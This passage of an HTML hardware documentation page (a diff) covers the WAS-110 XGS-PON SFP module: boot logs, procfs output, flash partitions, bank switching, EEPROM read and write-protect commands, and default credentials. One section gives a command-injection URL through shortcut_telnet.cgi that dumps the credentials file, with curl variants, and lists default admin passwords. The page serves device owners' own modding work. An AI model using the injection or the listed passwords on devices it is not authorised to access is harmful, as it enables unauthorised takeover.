+set_bootcmd_env:56 PRECONFIG_CONF_BOOTCMD_ENV=run ubi_init;ubi remove rootfs_data;run flash_flash 
+set_bootcmd_env:57 PRECONFIG_[   39.186021] random: fast init done
+CONF_BOOTCMD_ENV, strlen=51 
+set_bootcmd_env:60 new_buf= &quot;run ubi_init;ubi remove rootfs_data;run flash_flash&quot; 
+set_bootcmd_env:66 bootcmd is default! 
+set_bootcmd_env:67 go on! 
+[   39.955597] pon_mbox 18100000.ponmbox: abort write because mailbox is in reset
+p408 omci main start
+[omcid] Use OMCC version 0xa3
+[omcid] Use LCT port UNI1
+[   45.150158] get mesg from user, pid = 2242
+[   46.341421] pon_mbox: FW version: 3.21.0.3.14-1669214605
+[   47.193701] [PON]&lt;Info&gt;, line[165], pon_krl_set_dynm_link_detc:In
+[   47.193701] 
+[   47.200060] [PON]&lt;Info&gt;, line[173], pon_krl_set_dynm_link_detc:dynamic link detection enable:1
+[   47.200060] 
+[   49.436988] gpio_ioctl:51 gpio.pin=24, gpio.data=0
+[   49.505580] pon_mbox 18100000.ponmbox: cannot send FW multicast netlink msg: -3
+[   49.511546] pon_mbox 18100000.ponmbox: cannot send netlink response: ret: -3
+[   49.518591] pon_mbox 18100000.ponmbox: cannot send FW multicast netlink msg: -3
+[   49.525815] pon_mbox 18100000.ponmbox: cannot send netlink response: ret: -3
+[   49.532886] pon_mbox 18100000.ponmbox: cannot send FW multicast netlink msg: -3
+[   49.540136] pon_mbox 18100000.ponmbox: cannot send netlink response: ret: -3
+</code></pre></div>
+<h3 id="procfs">procfs <sup id="fnref:3"><a class="footnote-ref" href="#fn:3">3</a></sup><a class="headerlink" href="#procfs" title="Permanent link">&para;</a></h3>
+<div class="tabbed-set tabbed-alternate" data-tabs="1:4"><input checked="checked" id="proccmdline" name="__tabbed_1" type="radio" /><input id="proccpuinfo" name="__tabbed_1" type="radio" /><input id="procmeminfo" name="__tabbed_1" type="radio" /><input id="procmtd" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="proccmdline">/proc/cmdline</label><label for="proccpuinfo">/proc/cpuinfo</label><label for="procmeminfo">/proc/meminfo</label><label for="procmtd">/proc/mtd</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><pre><span></span><code>ubi.mtd=system_sw,2048 rootfsname=rootfsA rootfstype=squashfs ip=192.168.1.1:192.168.1.2:192.162.1.1:255.255.255.0::eth0:on earlycon=lantiq,0x16380000 console=ttyLTQ0,115200 ethaddr=00:E0:92:00:01:40 machtype=PRX126_SFP_PON mtdparts=nand.0:1m(uboot),256k(ubootconfigA),256k(ubootconfigB),256k(gphyfirmware),1m(calibration),16m(bootcore),102m(system_sw),6m(ptdata),-(res) cpuclk=400000000 rst_cause=POR_RESET mem=1024M@512M
+</code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><pre><span></span><code>system type     : PRX300 rev 1.2
+machine         : PRX126-SFP-PON
+processor       : 0
+cpu model       : MIPS interAptiv (multi) V2.0
+BogoMIPS        : 265.98
+wait instruction    : yes
+microsecond timers  : yes
+tlb_entries     : 32
+extra interrupt vector  : yes
+hardware watchpoint : yes, count: 4, address/irw mask: [0x0ffc, 0x0ffc, 0x0ffb, 0x0ffb]
+isa         : mips1 mips2 mips32r1 mips32r2
+ASEs implemented    : dsp mt eva
+Options implemented : tlb tlbinv segments 4kex 4k_cache prefetch mcheck ejtag llsc pindexed_dcache userlocal vint perf_cntr_intr_bit cdmm nan_legacy nan_2008 ebase_wg perf
+shadow register sets    : 1
+kscratch registers  : 0
+package         : 0
+core            : 0
+VPE         : 0
+VCED exceptions     : not available
+VCEI exceptions     : not available
+</code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><pre><span></span><code>MemTotal:         996604 kB
+MemFree:          411108 kB
+MemAvailable:     398692 kB
+Buffers:            5692 kB
+Cached:            21804 kB
+SwapCached:            0 kB
+Active:            15020 kB
+Inactive:          16152 kB
+Active(anon):       3676 kB
+Inactive(anon):        0 kB
+Active(file):      11344 kB
+Inactive(file):    16152 kB
+Unevictable:           0 kB
+Mlocked:               0 kB
+SwapTotal:             0 kB
+SwapFree:              0 kB
+Dirty:                 0 kB
+Writeback:             0 kB
+AnonPages:          3696 kB
+Mapped:             8452 kB
+Shmem:                 0 kB
+Slab:              10432 kB
+SReclaimable:       2592 kB
+SUnreclaim:         7840 kB
+KernelStack:         832 kB
+PageTables:          292 kB
+NFS_Unstable:          0 kB
+Bounce:                0 kB
+WritebackTmp:          0 kB
+CommitLimit:      498300 kB
+Committed_AS:      10536 kB
+VmallocTotal:     524280 kB
+VmallocUsed:           0 kB
+VmallocChunk:          0 kB
+CmaTotal:         573440 kB
+CmaFree:           46404 kB
+</code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><pre><span></span><code>dev:    size   erasesize  name
+mtd0: 00100000 00020000 &quot;uboot&quot;
+mtd1: 00040000 00020000 &quot;ubootconfigA&quot;
+mtd2: 00040000 00020000 &quot;ubootconfigB&quot;
+mtd3: 00040000 00020000 &quot;gphyfirmware&quot;
+mtd4: 00100000 00020000 &quot;calibration&quot;
+mtd5: 01000000 00020000 &quot;bootcore&quot;
+mtd6: 06600000 00020000 &quot;system_sw&quot;
+mtd7: 00600000 00020000 &quot;ptdata&quot;
+mtd8: 00140000 00020000 &quot;res&quot;
+mtd9: 0024d000 0001f000 &quot;kernelA&quot;
+mtd10: 00554000 0001f000 &quot;bootcoreA&quot;
+mtd11: 00ac7000 0001f000 &quot;rootfsA&quot;
+mtd12: 0022b510 0001f000 &quot;kernelB&quot;
+mtd13: 005b1000 0001f000 &quot;bootcoreB&quot;
+mtd14: 01322000 0001f000 &quot;rootfsB&quot;
+mtd15: 005d0000 0001f000 &quot;ptconf&quot;
+mtd16: 02017000 0001f000 &quot;rootfs_data&quot;
+</code></pre></div>
+</div>
+</div>
+</div>
+<h3 id="mtds">MTDs <sup id="fnref:5"><a class="footnote-ref" href="#fn:5">5</a></sup> <sup id="fnref:6"><a class="footnote-ref" href="#fn:6">6</a></sup> <sup id="fnref:7"><a class="footnote-ref" href="#fn:7">7</a></sup><a class="headerlink" href="#mtds" title="Permanent link">&para;</a></h3>
+<pre class="mermaid"><code>block-beta
+    block:BOOT
+        columns 1
+        mtd0("&lt;b&gt;uboot&lt;/b&gt;\n/dev/mtd0")
+        mtd1("&lt;b&gt;ubootconfigA&lt;/b&gt;\n/dev/mtd1")
+        mtd2("&lt;b&gt;ubootconfigB&lt;/b&gt;\n/dev/mtd2")
+    end
+    block:UBI("/dev/ubi0")
+        columns 2
+        block A
+            columns 1
+            mtd9("&lt;b&gt;kernelA&lt;/b&gt;\n/dev/mtd9")
+            mtd10("&lt;b&gt;bootcoreA&lt;/b&gt;\n/dev/mtd10")
+            mtd11("&lt;b&gt;rootfsA&lt;/b&gt;\n/dev/mtd11")
+        end
+        block B
+            columns 1
+            mtd12("&lt;b&gt;kernelB&lt;/b&gt;\n/dev/mtd12")
+            mtd13("&lt;b&gt;bootcoreB&lt;/b&gt;\n/dev/mtd13")
+            mtd14("&lt;b&gt;rootfsB&lt;/b&gt;\n/dev/mtd14")
+        end
+        block:PERSIST:2
+            columns 1
+            mtd15("&lt;b&gt;ptconf&lt;/b&gt;\n/dev/mtd15")
+            mtd16("&lt;b&gt;rootsfs_data&lt;/b&gt;\n/dev/mtd16")
+        end
+    end
+    classDef transparentBlock fill:transparent,stroke:transparent;
+    classDef boldTitle fill:transparent,stroke:transparent,font-weight:bold;
+    class BOOT,PERSIST transparentBlock
+    class A,B boldTitle</code></pre>
+<h4 id="switch-banks">Switch banks<a class="headerlink" href="#switch-banks" title="Permanent link">&para;</a></h4>
+<div class="admonition warning">
+<p class="admonition-title">Verify image(s) are valid before committing</p>
+</div>
+<p>Alternate between banks A and B</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="2:2"><input checked="checked" id="openwrt-shell" name="__tabbed_2" type="radio" /><input id="u-boot-shell" name="__tabbed_2" type="radio" /><div class="tabbed-labels"><label for="openwrt-shell">OpenWrt shell</label><label for="u-boot-shell">U-Boot shell</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<p>Switch from bank A to B.</p>
+<div class="highlight"><pre><span></span><code>fw_printenv<span class="w"> </span>commit_bank<span class="w"> </span><span class="c1"># (1)!</span>
+fw_printenv<span class="w"> </span>img_validB<span class="w"> </span><span class="c1"># (2)!</span>
+fw_setenv<span class="w"> </span>commit_bank<span class="w"> </span>B
+fw_setenv<span class="w"> </span>commit_bank<span class="w"> </span>B
+</code></pre></div>
+<ol>
+<li>Verify the committed bank is A.</li>
+<li>Verify bank B is valid prior to committing.</li>
+</ol>
+<p>Switch from bank B to A.</p>
+<div class="highlight"><pre><span></span><code>fw_printenv<span class="w"> </span>commit_bank<span class="w"> </span><span class="c1"># (1)!</span>
+fw_printenv<span class="w"> </span>img_validA<span class="w"> </span><span class="c1"># (2)!</span>
+fw_setenv<span class="w"> </span>commit_bank<span class="w"> </span>A
+fw_setenv<span class="w"> </span>commit_bank<span class="w"> </span>A
+</code></pre></div>
+<ol>
+<li>Verify the committed bank is B.</li>
+<li>Verify bank A is valid prior to committing.</li>
+</ol>
+</div>
+<div class="tabbed-block">
+<p>Switch from bank A to B.</p>
+<div class="highlight"><pre><span></span><code>env<span class="w"> </span>print<span class="w"> </span>commit_bank<span class="w"> </span><span class="c1"># (1)!</span>
+env<span class="w"> </span>print<span class="w"> </span>img_validB<span class="w"> </span><span class="c1"># (2)!</span>
+env<span class="w"> </span><span class="nb">set</span><span class="w"> </span>commit_bank<span class="w"> </span>B
+env<span class="w"> </span>save
+eve<span class="w"> </span>save
+</code></pre></div>
+<ol>
+<li>Verify the committed bank is A.</li>
+<li>Verify bank B is valid prior to committing.</li>
+</ol>
+<p>Switch from bank B to A.</p>
+<div class="highlight"><pre><span></span><code>env<span class="w"> </span>print<span class="w"> </span>commit_bank<span class="w"> </span><span class="c1"># (1)!</span>
+env<span class="w"> </span>print<span class="w"> </span>img_validA<span class="w"> </span><span class="c1"># (2)!</span>
+env<span class="w"> </span><span class="nb">set</span><span class="w"> </span>commit_bank<span class="w"> </span>A
+env<span class="w"> </span>save
+eve<span class="w"> </span>save
+</code></pre></div>
+<ol>
+<li>Verify the committed bank is B.</li>
+<li>Verify bank A is valid prior to committing.</li>
+</ol>
+</div>
+</div>
+</div>
+<h2 id="eeprom"><abbr title="Electrically Erasable Programmable Read-Only Memory">EEPROM</abbr><a class="headerlink" href="#eeprom" title="Permanent link">&para;</a></h2>
+<p>The Digital Diagnostic Monitor Interface (<abbr title="Digital Diagnostic Monitor Interface">DDMI</abbr>)<sup id="fnref:11"><a class="footnote-ref" href="#fn:11">9</a></sup> is handled by the MACOM <a href="https://www.macom.com/products/product-detail/M02180" rel="noopener" target="_blank">M02180</a> laser driver over an I2C bus and
+within Linux through a virtual <abbr title="Electrically Erasable Programmable Read-Only Memory">EEPROM</abbr> that takes precedence once the kernel module <code>mod_sfp_i2c</code> is loaded and
+<code>/etc/init.d/sfp_eeprom.sh</code> is started.</p>
+<p>There are several interfaces and utilities that provide read and/or write access to the <abbr title="Electrically Erasable Programmable Read-Only Memory">EEPROM</abbr>(s).</p>
+<h3 id="read">Read<a class="headerlink" href="#read" title="Permanent link">&para;</a></h3>
+<h4 id="a0-0x50">A0 (0x50)<a class="headerlink" href="#a0-0x50" title="Permanent link">&para;</a></h4>
+<div class="tabbed-set tabbed-alternate" data-tabs="3:2"><input checked="checked" id="virtual-eeprom-non-persistent" name="__tabbed_3" type="radio" /><input id="physical-eeprom_1" name="__tabbed_3" type="radio" /><div class="tabbed-labels"><label for="virtual-eeprom-non-persistent">Virtual <abbr title="Electrically Erasable Programmable Read-Only Memory">EEPROM</abbr> <small>Non-Persistent</small></label><label for="physical-eeprom_1">Physical <abbr title="Electrically Erasable Programmable Read-Only Memory">EEPROM</abbr></label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><pre><span></span><code>sfp_i2c<span class="w"> </span>-r<span class="w"> </span>-i<span class="w"> </span><span class="m">0</span><span class="w"> </span>-l<span class="w"> </span><span class="m">256</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>hexdump<span class="w"> </span>-Cv<span class="w"> </span>/dev/sfp_eeprom0
+</code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><pre><span></span><code>hexdump<span class="w"> </span>-Cv<span class="w"> </span>/sys/class/pon_mbox/pon_mbox0/device/eeprom50
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>ethtool<span class="w"> </span>-m<span class="w"> </span>pon0<span class="w"> </span>raw<span class="w"> </span>on<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-c<span class="w"> </span><span class="m">256</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>hexdump<span class="w"> </span>-Cv
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>i2cdump<span class="w"> </span>-fy<span class="w"> </span><span class="m">0</span><span class="w"> </span>0x50
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>i2cget<span class="w"> </span>-fy<span class="w"> </span><span class="m">0</span><span class="w"> </span>0x50<span class="w"> </span>0x0
+</code></pre></div>
+</div>
+</div>
+</div>
+<h4 id="a2-0x51">A2 (0x51)<a class="headerlink" href="#a2-0x51" title="Permanent link">&para;</a></h4>
+<div class="tabbed-set tabbed-alternate" data-tabs="4:2"><input checked="checked" id="virtual-eeprom-non-persistent_1" name="__tabbed_4" type="radio" /><input id="physical-eeprom_2" name="__tabbed_4" type="radio" /><div class="tabbed-labels"><label for="virtual-eeprom-non-persistent_1">Virtual <abbr title="Electrically Erasable Programmable Read-Only Memory">EEPROM</abbr> <small>Non-Persistent</small></label><label for="physical-eeprom_2">Physical <abbr title="Electrically Erasable Programmable Read-Only Memory">EEPROM</abbr></label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><pre><span></span><code>sfp_i2c<span class="w"> </span>-r<span class="w"> </span>-i<span class="w"> </span><span class="m">256</span><span class="w"> </span>-l<span class="w"> </span><span class="m">256</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>hexdump<span class="w"> </span>-Cv<span class="w"> </span>/dev/sfp_eeprom1
+</code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><pre><span></span><code>hexdump<span class="w"> </span>-Cv<span class="w"> </span>/sys/class/pon_mbox/pon_mbox0/device/eeprom51
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>ethtool<span class="w"> </span>-m<span class="w"> </span>pon0<span class="w"> </span>raw<span class="w"> </span>on<span class="w"> </span><span class="p">|</span><span class="w"> </span>tail<span class="w"> </span>-c<span class="w"> </span><span class="m">256</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>hexdump<span class="w"> </span>-Cv
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>i2cdump<span class="w"> </span>-fy<span class="w"> </span><span class="m">0</span><span class="w"> </span>0x51
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>i2cget<span class="w"> </span>-fy<span class="w"> </span><span class="m">0</span><span class="w"> </span>0x51<span class="w"> </span>0x0
+</code></pre></div>
+</div>
+</div>
+</div>
+<h3 id="write">Write<a class="headerlink" href="#write" title="Permanent link">&para;</a></h3>
+<h4 id="physical-eeprom">Physical <abbr title="Electrically Erasable Programmable Read-Only Memory">EEPROM</abbr><a class="headerlink" href="#physical-eeprom" title="Permanent link">&para;</a></h4>
+<div class="admonition warning">
+<p class="admonition-title">Incorrect writes to the <abbr title="Electrically Erasable Programmable Read-Only Memory">EEPROM</abbr> can prevent the host from recognizing the WAS-110</p>
+</div>
+<p>The <abbr title="Electrically Erasable Programmable Read-Only Memory">EEPROM</abbr> is write protected and can be disabled by writing <code>12345678</code> to A2 (0x51) at offset <code>0x7B</code>.</p>
+<div class="highlight"><pre><span></span><code>i2cset<span class="w"> </span>-fy<span class="w"> </span><span class="m">0</span><span class="w"> </span>0x51<span class="w"> </span>0x7B<span class="w"> </span>0x12<span class="w"> </span>0x34<span class="w"> </span>0x56<span class="w"> </span>0x78<span class="w"> </span>i
+</code></pre></div>
+<p>To re-enable write protection, write <code>00000000</code> to A2 (0x51) at offset <code>0x7B</code>.</p>
+<div class="highlight"><pre><span></span><code>i2cset<span class="w"> </span>-fy<span class="w"> </span><span class="m">0</span><span class="w"> </span>0x51<span class="w"> </span>0x7B<span class="w"> </span>0x00<span class="w"> </span>0x00<span class="w"> </span>0x00<span class="w"> </span>0x00<span class="w"> </span>i
+</code></pre></div>
+<h2 id="default-credentials">Default Credentials<a class="headerlink" href="#default-credentials" title="Permanent link">&para;</a></h2>
+<h3 id="web-credentials">Web credentials<a class="headerlink" href="#web-credentials" title="Permanent link">&para;</a></h3>
+<p>The default web credentials can be found in <code>/ptrom/ptconf/param_ct.xml</code>. Modifications from the web <abbr title="User Interface">UI</abbr> are stored in
+<code>/ptrom/ptconf/usrconfig_conf</code> as base64 encoded strings.</p>
+<div class="admonition warning">
+<p class="admonition-title">Passwords have a maximum length of 16 characters which are not restricted by the web <abbr title="User Interface">UI</abbr></p>
+</div>
+<details class="bug">
+<summary>Exploit to disclose the default web credentials</summary>
+<p>To dump the web credentials from <code>/ptrom/ptconf/param_ct.xml</code>, navigate to:</p>
+<p><a href="http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml" rel="noopener" target="_blank">http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml</a></p>
+<p>Alternatively, run the following command(s) to download <code>param_ct.xml</code> to a temporary directory.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="5:3"><input checked="checked" id="windows" name="__tabbed_5" type="radio" /><input id="macos" name="__tabbed_5" type="radio" /><input id="linux" name="__tabbed_5" type="radio" /><div class="tabbed-labels"><label for="windows"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M2 3h9v9H2zm9 19H2v-9h9zM21 3v9h-9V3zm0 19h-9v-9h9z"/></svg></span> Windows</label><label for="macos"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.039 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.559-1.701"/></svg></span> macOS</label><label for="linux"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12.504 0q-.232 0-.48.021c-4.226.333-3.105 4.807-3.17 6.298-.076 1.092-.3 1.953-1.05 3.02-.885 1.051-2.127 2.75-2.716 4.521-.278.832-.41 1.684-.287 2.489a.4.4 0 0 0-.11.135c-.26.268-.45.6-.663.839-.199.199-.485.267-.797.4-.313.136-.658.269-.864.68-.09.189-.136.394-.132.602 0 .199.027.4.055.536.058.399.116.728.04.97-.249.68-.28 1.145-.106 1.484.174.334.535.47.94.601.81.2 1.91.135 2.774.6.926.466 1.866.67 2.616.47.526-.116.97-.464 1.208-.946.587-.003 1.23-.269 2.26-.334.699-.058 1.574.267 2.577.2.025.134.063.198.114.333l.003.003c.391.778 1.113 1.132 1.884 1.071s1.592-.536 2.257-1.306c.631-.765 1.683-1.084 2.378-1.503.348-.199.629-.469.649-.853.023-.4-.2-.811-.714-1.376v-.097l-.003-.003c-.17-.2-.25-.535-.338-.926-.085-.401-.182-.786-.492-1.046h-.003c-.059-.054-.123-.067-.188-.135a.36.36 0 0 0-.19-.064c.431-1.278.264-2.55-.173-3.694-.533-1.41-1.465-2.638-2.175-3.483-.796-1.005-1.576-1.957-1.56-3.368.026-2.152.236-6.133-3.544-6.139m.529 3.405h.013c.213 0 .396.062.584.198.19.135.33.332.438.533.105.259.158.459.166.724 0-.02.006-.04.006-.06v.105l-.004-.021-.004-.024a1.8 1.8 0 0 1-.15.706.95.95 0 0 1-.213.335 1 1 0 0 0-.088-.042c-.104-.045-.198-.064-.284-.133a1.3 1.3 0 0 0-.22-.066c.05-.06.146-.133.183-.198q.08-.193.088-.402v-.02a1.2 1.2 0 0 0-.061-.4c-.045-.134-.101-.2-.183-.333-.084-.066-.167-.132-.267-.132h-.016c-.093 0-.176.03-.262.132a.8.8 0 0 0-.205.334 1.2 1.2 0 0 0-.09.4v.019q.002.134.02.267c-.193-.067-.438-.135-.607-.202a2 2 0 0 1-.018-.2v-.02a1.8 1.8 0 0 1 .15-.768 1.08 1.08 0 0 1 .43-.533 1 1 0 0 1 .594-.2zm-2.962.059h.036c.142 0 .27.048.399.135.146.129.264.288.344.465.09.199.14.4.153.667v.004c.007.134.006.2-.002.266v.08c-.03.007-.056.018-.083.024-.152.055-.274.135-.393.2q.018-.136.003-.267v-.015c-.012-.133-.04-.2-.082-.333a.6.6 0 0 0-.166-.267.25.25 0 0 0-.183-.064h-.021c-.071.006-.13.04-.186.132a.55.55 0 0 0-.12.27 1 1 0 0 0-.023.33v.015c.012.135.037.2.08.334.046.134.098.2.166.268q.014.014.034.024c-.07.057-.117.07-.176.136a.3.3 0 0 1-.131.068 2.6 2.6 0 0 1-.275-.402 1.8 1.8 0 0 1-.155-.667 1.8 1.8 0 0 1 .08-.668 1.4 1.4 0 0 1 .283-.535c.128-.133.26-.2.418-.2m1.37 1.706c.332 0 .733.065 1.216.399.293.2.523.269 1.052.468h.003c.255.136.405.266.478.399v-.131a.57.57 0 0 1 .016.47c-.123.31-.516.643-1.063.842v.002c-.268.135-.501.333-.775.465-.276.135-.588.292-1.012.267a1.1 1.1 0 0 1-.448-.067 4 4 0 0 1-.322-.198c-.195-.135-.363-.332-.612-.465v-.005h-.005c-.4-.246-.616-.512-.686-.71q-.104-.403.193-.6c.224-.135.38-.271.483-.336.104-.074.143-.102.176-.131h.002v-.003c.169-.202.436-.47.839-.601.139-.036.294-.065.466-.065zm2.8 2.142c.358 1.417 1.196 3.475 1.735 4.473.286.534.855 1.659 1.102 3.024.156-.005.33.018.513.064.646-1.671-.546-3.467-1.089-3.966-.22-.2-.232-.335-.123-.335.59.534 1.365 1.572 1.646 2.757.13.535.16 1.104.021 1.67.067.028.135.06.205.067 1.032.534 1.413.938 1.23 1.537v-.043c-.06-.003-.12 0-.18 0h-.016c.151-.467-.182-.825-1.065-1.224-.915-.4-1.646-.336-1.77.465-.008.043-.013.066-.018.135-.068.023-.139.053-.209.064-.43.268-.662.669-.793 1.187-.13.533-.17 1.156-.205 1.869v.003c-.02.334-.17.838-.319 1.35-1.5 1.072-3.58 1.538-5.348.334a2.7 2.7 0 0 0-.402-.533 1.5 1.5 0 0 0-.275-.333c.182 0 .338-.03.465-.067a.62.62 0 0 0 .314-.334c.108-.267 0-.697-.345-1.163s-.931-.995-1.788-1.521c-.63-.4-.986-.87-1.15-1.396-.165-.534-.143-1.085-.015-1.645.245-1.07.873-2.11 1.274-2.763.107-.065.037.135-.408.974-.396.751-1.14 2.497-.122 3.854a8.1 8.1 0 0 1 .647-2.876c.564-1.278 1.743-3.504 1.836-5.268.048.036.217.135.289.202.218.133.38.333.59.465.21.201.477.335.876.335q.058.005.11.006c.412 0 .73-.134.997-.268.29-.134.52-.334.74-.4h.005c.467-.135.835-.402 1.044-.7zm2.185 8.958c.037.6.343 1.245.882 1.377.588.134 1.434-.333 1.791-.765l.211-.01c.315-.007.577.01.847.268l.003.003c.208.199.305.53.391.876.085.4.154.78.409 1.066.486.527.645.906.636 1.14l.003-.007v.018l-.003-.012c-.015.262-.185.396-.498.595-.63.401-1.746.712-2.457 1.57-.618.737-1.37 1.14-2.036 1.191-.664.053-1.237-.2-1.574-.898l-.005-.003c-.21-.4-.12-1.025.056-1.69.176-.668.428-1.344.463-1.897.037-.714.076-1.335.195-1.814.12-.465.308-.797.641-.984l.045-.022zm-10.814.049h.01q.08 0 .157.014c.376.055.706.333 1.023.752l.91 1.664.003.003c.243.533.754 1.064 1.189 1.637.434.598.77 1.131.729 1.57v.006c-.057.744-.48 1.148-1.125 1.294-.645.135-1.52.002-2.395-.464-.968-.536-2.118-.469-2.857-.602q-.553-.1-.723-.4c-.11-.2-.113-.602.123-1.23v-.004l.002-.003c.117-.334.03-.752-.027-1.118-.055-.401-.083-.71.043-.94.16-.334.396-.4.69-.533.294-.135.64-.202.915-.47h.002v-.002c.256-.268.445-.601.668-.838.19-.201.38-.336.663-.336m7.159-9.074c-.435.201-.945.535-1.488.535-.542 0-.97-.267-1.28-.466-.154-.134-.28-.268-.373-.335-.164-.134-.144-.333-.074-.333.109.016.129.134.199.2.096.066.215.2.36.333.292.2.68.467 1.167.467.485 0 1.053-.267 1.398-.466.195-.135.445-.334.648-.467.156-.136.149-.267.279-.267.128.016.034.134-.147.332a8 8 0 0 1-.69.468zm-1.082-1.583V5.64c-.006-.02.013-.042.029-.05.074-.043.18-.027.26.004.063 0 .16.067.15.135-.006.049-.085.066-.135.066-.055 0-.092-.043-.141-.068-.052-.018-.146-.008-.163-.065m-.551 0c-.02.058-.113.049-.166.066-.047.025-.086.068-.14.068-.05 0-.13-.02-.136-.068-.01-.066.088-.133.15-.133.08-.031.184-.047.259-.005.019.009.036.03.03.05v.02h.003z"/></svg></span> Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<p><strong>Command Prompt</strong></p>
+<div class="highlight"><pre><span></span><code>dir<span class="w"> </span>%Temp%<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>curl.exe<span class="w"> </span>-O<span class="w"> </span><span class="s2">&quot;http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml&quot;</span>
+</code></pre></div>
+<p><strong>Powershell / Windows Terminal</strong></p>
+<div class="highlight"><pre><span></span><code>dir<span class="w"> </span>%Temp%<span class="w"> </span><span class="p">;</span><span class="w"> </span>curl.exe<span class="w"> </span>-O<span class="w"> </span><span class="s2">&quot;http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml&quot;</span>
+</code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><pre><span></span><code><span class="nb">cd</span><span class="w"> </span>/tmp<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>curl<span class="w"> </span>-O<span class="w"> </span><span class="s2">&quot;http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml&quot;</span>
+</code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="admonition note">
+<p class="admonition-title">The following commands assume <a href="https://www.debian.org/" rel="noopener" target="_blank">Debian</a> or derivatives<sup id="fnref2:4"><a class="footnote-ref" href="#fn:4">4</a></sup></p>
+</div>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>curl
+<span class="nb">cd</span><span class="w"> </span>/tmp<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>curl<span class="w"> </span>-O<span class="w"> </span><span class="s2">&quot;http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml&quot;</span>
+</code></pre></div>
+</div>
+</div>
+</div>
+</details>
+<div class="tabbed-set tabbed-alternate" data-tabs="6:2"><input checked="checked" id="firmware-v1021" name="__tabbed_6" type="radio" /><input id="firmware--v1020" name="__tabbed_6" type="radio" /><div class="tabbed-labels"><label for="firmware-v1021">Firmware v1.0.21</label><label for="firmware--v1020">Firmware &lt;= v1.0.20</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>admin</td>
+<td>BR#22729%635e9</td>
+</tr>
+<tr>
+<td>user</td>
+<td>user1234</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div class="tabbed-block">
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>admin</td>
+<td>QsCg@7249#5281</td>
+</tr>
+<tr>
+<td>user</td>
+<td>user1234</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+<h3 id="shell-credentials">Shell credentials<a class="headerlink" href="#shell-credentials" title="Permanent link">&para;</a></h3>
+<p><abbr title="Secure SHell">SSH</abbr> must be enabled from the web <abbr title="User Interface">UI</abbr> at <a href="https://192.168.11.1/html/main.html#service/servicecontrol" rel="noopener" target="_blank">https://192.168.11.1/html/main.html#service/servicecontrol</a></p>
+<details class="- info">
+<summary>OpenSSH/SSL: unsupported algorithms and changes since 8.8 and newer</summary>
+<div class="highlight"><pre><span></span><code>ssh<span class="w"> </span>-V
+openssl<span class="w"> </span>version
+</code></pre></div>
+<p><a href="https://www.openssh.com/releasenotes.html" rel="noopener" target="_blank">https://www.openssh.com/releasenotes.html</a></p>
+<p><strong>Red Hat/CentOS/Fedora/Rocky Linux</strong></p>
